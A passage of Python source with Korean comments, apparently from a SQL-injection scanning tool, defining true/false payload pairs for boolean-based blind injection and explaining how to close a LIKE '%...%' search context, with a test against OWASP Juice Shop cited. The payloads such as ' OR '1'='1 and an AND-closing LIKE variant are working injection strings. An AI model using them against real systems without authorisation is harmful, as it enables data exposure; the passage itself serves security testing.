...
# 우선**한다: 홑따옴표 문자열 / 숫자 / LIKE '%...%' 검색 / 괄호로 감싼 문자열. 나머지는 더 큰 예산일 때
# 시도되는 overflow(겹따옴표·주석 종결·괄호+겹따옴표·MySQL # 주석).
#
# **LIKE '%...%' 컨텍스트(J-3 라이브 발견, Juice Shop /rest/products/search)**: 검색어가 `name LIKE
# '%<inject>%'`처럼 와일드카드에 싸이면, 문자열을 `'`로 탈출하는 순간 **앞의 `%`가 `LIKE '%'`(전체 매치)**가
# 돼 OR tautology로는 참/거짓이 안 갈린다(둘 다 전체 행 — 실측 13644B=13644B). 그래서 **AND로 결과셋을
# 닫아야** 한다: `%' AND '1'='1' AND '1' LIKE '`는 `LIKE '%%' AND '1'='1' AND '1' LIKE '%'`로 완성돼
# (뒤 템플릿 `%'`를 `'1' LIKE '%'`로 흡수 → 주석·괄호 훼손 없이 유효 SQL) 참=전체행/거짓=0행으로 갈린다.
# 정상 `= '...'` 컨텍스트에선 `name='%'`가 아무 행도 안 열어 오탐도 없다(순수 additive).
_PAYLOAD_PAIRS: list[tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),            # 문자열, 홑따옴표 탈출
    ("1 OR 1=1", "1 OR 1=2"),                  # 숫자 컨텍스트
    ("%' AND '1'='1' AND '1' LIKE '",          # LIKE '%...%' 검색 — AND로 닫기(참=전체/거짓=0행)
     "%' AND '1'='2' AND '1' LIKE '"),
    ("') OR ('1'='1", "') OR ('1'='2"),        # 괄호로 감싼 문자열 WHERE — `(col = '...')` 닫기
    ('" OR "1"="1', '" OR "1"="2'),            # (overflow) 문자열, 겹따옴표 탈출
